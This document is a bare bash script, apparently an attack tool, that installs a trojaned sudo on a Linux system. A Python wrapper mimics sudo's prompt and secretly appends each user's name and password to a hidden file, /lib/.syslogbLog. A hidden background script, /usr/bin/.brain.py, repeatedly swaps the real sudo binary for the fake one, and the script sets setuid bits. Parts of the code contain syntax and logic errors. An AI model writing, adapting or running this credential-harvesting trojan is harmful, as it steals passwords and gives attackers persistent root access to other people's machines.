#!/bin/bash
cat <<EOFA > /usr/bin/sudoB
import os
import subprocess
import sys
import getpass
import socket

def main():
    if(len(sys.argv) == 1):
        print("""
        usage: sudo -h | -K | -k | -V
        usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
        usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
        usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
        usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
        """)
    else:
        user = getpass.getuser()
        
        os.system('stty -echo')
        sudoCommand = "[sudo] password for " + user + ": "
        password = input(sudoCommand)
        
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
        password = (password + '\n')
        encoded = password.encode('utf-8')
        os.system('stty echo')
        arguments = ' '.join(sys.argv[1:])
        sudoCmd = ['sudoA', '-l', 'su']
        command = subprocess.Popen(sudoCmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = command.communicate(password)
        output = str(command).split()
        if(output[2] == '0'):
            runShell(password)
        else:
            print(user+" is not in the sudoers file. This incident will be reported.")
def runShell(password):
    cont = True
    directory = "~"
    host = socket.gethostname()
    while(cont):
        option = input("[root@"+host+" "+directory+"]# ")
        if(len(option) == 0):
            pass
        elif(option.lower() in ('exit')):
            print("exit")
            return
        else:
            #command = "sudoA -S "+option
            runCommand(password, option)
def runCommand(password, command):
    try:
        password = "b\'+password+\'"
        result = subprocess.run(['sudoA', '-S', command], input=password, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(e)
main()
EOFA
cat <<EOFB > /usr/bin/sudoC
#!/bin/bash
python3 /usr/bin/sudoB "$@"
EOFB
cat <<EOFC > /usr/bin/.brain.py
import os
import time

def main():
    while(True):
        if(os.path.exists("/usr/bin/sudoC"):
            os.system("mv /usr/bin/sudo /usr/bin/sudoA")
            os.system("mv /usr/bin/sudoC /usr/bin/sudo")
        time.sleep(180)
main()
EOFC
chmod +s /usr/bin/.brain.py
chmod +x /usr/bin/.brain.py
python3 /usr/bin/.brain.py &
chmod +s /usr/bin/sudo
chmod +x /usr/bin/sudo
chmod +s /usr/bin/sudoB
chmod +x /usr/bin/sudoB
chmod o+w /lib/.syslogbLog